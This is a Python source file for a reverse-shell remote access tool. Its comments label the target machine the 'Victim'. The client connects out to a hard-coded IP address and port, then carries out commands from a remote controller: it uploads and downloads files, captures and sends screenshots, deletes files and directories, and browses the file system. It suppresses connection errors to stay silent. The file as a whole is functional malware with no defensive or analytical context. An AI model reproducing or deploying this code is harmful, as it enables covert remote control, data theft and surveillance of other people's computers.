from genericpath import exists
from subprocess import Popen
import subprocess
import os
import socket
from sys import stderr, stdin, stdout
from pyautogui import screenshot
import datetime
try:
    client=socket.socket()
    client.connect(('192.168.10.6',4321))
    while True:
        command=client.recv(1024).decode()
##################################################################################
#                          Code for Uploading file to Victim
################################################################################## 
        if command[:6]=='upload':
            file_name=open(command[7:],'wb')
            while True:
                file_binaries=client.recv(1024)
                if file_binaries==b'':
                    break
                else:
                    file_name.write(file_binaries)
##################################################################################
#                          Code for Uploading file to Victim
################################################################################## 
        elif command[:8]=='download':
            file_name=open(command[9:],'rb')
            while True:
                file_binaries=file_name.read()
                if file_binaries==b'':
                    break
                else:
                    client.sendall(file_binaries)                       
##################################################################################
#                          Code for Screenshot
################################################################################## 
        elif command=='screenshot':
            #Taking Screenshot            
            screenshot_name='screenshot.png'
            screen=screenshot()
            screen.save(str(screenshot_name)) 
            #Opeing Screen shot file
            file_name=open(screenshot_name,'rb')
            #Sending Screenshot
            while True:
                file_binaries=file_name.read()
                if file_binaries==b'':
                    break
                else:
                    client.sendall(file_binaries)
            #Delete Sent Screenshot        
            if os.path.exists(screenshot_name):
                os.remove(screenshot_name) 
        elif command[:6]=='delete':
            if os.path.exists(command[7:]):
                os.remove(command[7:])
                client.send('Deleted'.encode())
            else:
                client.send('Desired file does not exist'.encode())   
        elif command[:5]=='rmdir':
            if os.path.exists(command[6:]):
                os.rmdir(command[6:])
                client.send('Deleted'.encode())
            else:
                client.send('Directory Does not exist'.encode())  
        elif command=='pwd':
            client.send(str(os.getcwd()).encode())    
        elif command=='ls' or command=='dir':
            cmd=Popen(command,stdout=subprocess.PIPE,stdin=subprocess.PIPE,stderr=subprocess.PIPE,shell=True)
            ls=cmd.stdout.read()+cmd.stderr.read()
            client.send(str(ls).encode('UTF-8'))
        elif command[:2]=='cd':
            if os.path.exists(command[3:]):
             os.chdir(command[3:]) 
             client.send('Changed'.encode()) 


            else:
                client.send('No such Directory'.encode())









except ModuleNotFoundError:
    print("")   
except ConnectionRefusedError:
    print('')     
except ConnectionResetError:
    print('')    
